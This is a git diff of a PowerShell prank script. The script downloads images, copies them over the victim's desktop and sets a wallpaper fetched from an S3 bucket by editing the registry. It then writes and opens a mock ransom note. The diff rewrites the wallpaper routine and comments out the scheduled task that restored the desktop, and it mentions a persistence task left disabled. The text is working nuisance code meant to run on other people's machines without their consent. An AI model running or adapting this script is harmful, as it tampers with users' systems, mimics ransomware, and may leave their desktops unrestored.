@@ -41,7 +41,7 @@ foreach ($url in $urls){
 
     $path = join-path $downloadFolder $url
     $path = $path -replace '[^\p{L}\p{Nd}]', ''
-    $butts = Invoke-WebRequest -uri "$url" -Outfile "./test/$path.jpg"  
+    $butts = Invoke-WebRequest -uri "$url" -Outfile "$downloadFolder\$path.jpg"  
 }
 
 # Clear desktop and replace with images 
@@ -52,59 +52,14 @@ Get-ChildItem $downloadFolder | Copy-Item -Destination $desktop
 # Hit 'em with it
 # retrieve background image from S3
 $buttGrab = Invoke-WebRequest -uri "https://buttboss.s3.us-east-1.amazonaws.com/butt-wall-paper.jpg" -OutFile $downloadFolder\background.jpg
-$buttBackground = $downloadFolder\background.jpg
+$buttBackground = "$downloadFolder\background.jpg"
 
-Function Set-WallPaper ($Image = $buttBackground) {
-param (
-    [parameter(Mandatory=$True)]
-    # Provide path to image
-    [string]$Image,
-    # Provide wallpaper style that you would like applied
-    [parameter(Mandatory=$False)]
-    [ValidateSet('Fill', 'Fit', 'Stretch', 'Tile', 'Center', 'Span')]
-    [string]$Style
-)
-
-$WallpaperStyle = Switch ($Style) {
-    "Fill" {"10"}
-    "Fit" {"6"}
-    "Stretch" {"2"}
-    "Tile" {"0"}
-    "Center" {"0"}
-    "Span" {"22"}
-}
-
-If($Style -eq "Tile") {
-    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -PropertyType String -Value $WallpaperStyle -Force
-    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -PropertyType String -Value 1 -Force
-}
-Else {
-    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -PropertyType String -Value $WallpaperStyle -Force
-    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -PropertyType String -Value 0 -Force
-}
-
-Add-Type -TypeDefinition @"
-using System;
-using System.Runtime.InteropServices;
-
-public class Params
+function Change-Background ([string]$buttBackground)
 {
-    [DllImport("User32.dll",CharSet=CharSet.Unicode)]
-    public static extern int SystemParametersInfo (Int32 uAction,
-                                                   Int32 uParam,
-                                                   String lpvParam,
-                                                   Int32 fuWinIni);
+     set-itemproperty -path "HKCU:Control Panel\Desktop" -name WallPaper -value $buttBackground
+     RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True
 }
-"@
-
-    $SPI_SETDESKWALLPAPER = 0x0014
-    $UpdateIniFile = 0x01
-    $SendChangeEvent = 0x02
-
-    $fWinIni = $UpdateIniFile -bor $SendChangeEvent
-
-    $ret = [Params]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $Image, $fWinIni)
-}
+Change-Background $buttBackground
 
 # Write the ransom note, pop notepad, Invoke-Chills
 echo "Now who's boss." | Out-File -FilePath "C:\Goofin\buttbossin.txt"
@@ -113,9 +68,9 @@ notepad "C:\Goofin\buttbossin.txt"
 # Politeness Module
 # Reset the photots and icons after within 24 hours.
 
-$unbutt = New-ScheduledTaskAction -Execute "powershell.exe Copy-Item -Path 'C:\Goofin\cuts' -Destination $desktop -Recurse -Force"
-$scheduleunbutt = New-ScheduledTasktrigger -Once -At 12pm
-Register-ScheduledTask GoodByeButts -Action $unbutt -Trigger $scheduleunbutt
+# $unbutt = New-ScheduledTaskAction -Execute "powershell.exe Copy-Item -Path 'C:\Goofin\cuts' -Destination $desktop -Recurse -Force"
+# $scheduleunbutt = New-ScheduledTasktrigger -Once -At 12pm
+# Register-ScheduledTask GoodByeButts -Action $unbutt -Trigger $scheduleunbutt
 
 # Persistence Module / Scheduled Task
 # Commented out because it seemed irresponsible to have it be the default. This way people can play with it and not get butt'ed back in a week or two
